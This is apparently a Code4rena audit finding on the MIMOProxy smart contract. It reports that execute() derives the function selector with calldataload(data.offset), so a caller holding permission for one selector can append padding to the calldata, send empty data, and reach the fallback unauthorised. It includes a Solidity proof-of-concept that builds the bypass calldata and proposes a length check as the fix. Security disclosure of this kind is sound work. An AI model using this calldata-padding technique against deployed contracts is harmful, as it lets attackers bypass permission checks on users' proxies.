## Tags

- bug
- question
- 3 (High Risk)
- sponsor confirmed

# [Incorrect implementation of access control in MIMOProxy:execute](https://github.com/code-423n4/2022-08-mimo-findings/issues/159) 

# Lines of code

https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L54
https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104


# Vulnerability details

## Description

There is a function `execute` in `MIMOProxy` smart contract. The function performs a delegate call to the user-specified address with the specified data. As an access control, the function checks that either it was called by the owner or the owner has previously approved that the sender can call a specified target with specified calldata. See https://github.com/code-423n4/2022-08-mimo/blob/main/contracts/proxy/MIMOProxy.sol#L104. 

The check itself: 

```
    if (owner != msg.sender) {
      bytes4 selector;
      assembly {
        selector := calldataload(data.offset)
      }
      if (!_permissions[msg.sender][target][selector]) {
        revert CustomErrors.EXECUTION_NOT_AUTHORIZED(owner, msg.sender, target, selector);
      }
    }
```

The problem is how the `selector` is calculated. Specifically, `calldataload(data.offset)` - reads first 4 bytes of `data`.  Imagine `data.length == 0`, does it mean that `calldataload(data.offset)` will return `bytes4(0)`? No.

Let's see how calldata are accepted by functions in Solidity. The solidity function checks that the calldata length is less than needed, but does NOT check that there is no redundant data in calldata. That means, the function `execute(address target, bytes calldata data)` will definitely accept data that have `target` and `data`, but also in calldata can be other user-provided bytes. As a result,  `calldataload(data.offset)` can read trash, but not the `data` bytes.

And in the case of `execute` function, an attacker can affect the execution by providing `trash` data at the end of the function. Namely, if the attacker has permission to call the function with some `signature`, the attacker can call proxy contract bypass check for signature and make delegate call directly with zero calldata.

Please see proof-of-concept (PoC), `getAttackerCalldata` returns a calldata with which it is possible to bypass check permission for signature. Function `execute` from PoC simulate check for permission to call `signatureWithPermision`, and enforce that `data.length == 0`. With calldata from `getAttackerCalldata` it works.

## Impact

Any account that have permission to call at least one function (signature) to the contract can call fallback function without without permission to do so.

## Proof of Concept

```
// SPDX-License-Identifier: MIT OR Apache-2.0

pragma solidity ^0.8.0;

interface IMIMOProxy {
  event Execute(address indexed target, bytes data, bytes response);

  event TransferOwnership(address indexed oldOwner, address indexed newOwner);

  function initialize() external;

  function getPermission(
    address envoy,
    address target,
    bytes4 selector
  ) external view returns (bool);

  function owner() external view returns (address);

  function minGasReserve() external view returns (uint256);

  function execute(address target, bytes calldata data) external payable returns (bytes memory response);

  function setPermission(
    address envoy,
    address target,
    bytes4 selector,
    bool permission
  ) external;

  function transferOwnership(address newOwner) external;

  function multicall(address[] calldata targets, bytes[] calldata data) external returns (bytes[] memory);
}

contract PoC {
    bytes4 public signatureWithPermision = bytes4(0xffffffff);

    // Call this function with calldata that can be prepared in `getAttackerCalldata`
    function execute(address target, bytes calldata data) external {
        bytes4 selector;
        assembly {
            selector := calldataload(data.offset)
        }

        require(selector == signatureWithPermision);

        require(data.length == 0);
    }

    // Function that prepare attacker calldata
    function getAttackerCalldata() public view returns(bytes memory)  {
        bytes memory usualCalldata = abi.encodeWithSelector(IMIMOProxy.execute.selector, msg.sender, new bytes(0));
        return abi.encodePacked(usualCalldata, bytes32(signatureWithPermision));
    }
}
```

## Recommended Mitigation Steps

Add `require(data.length >= 4);`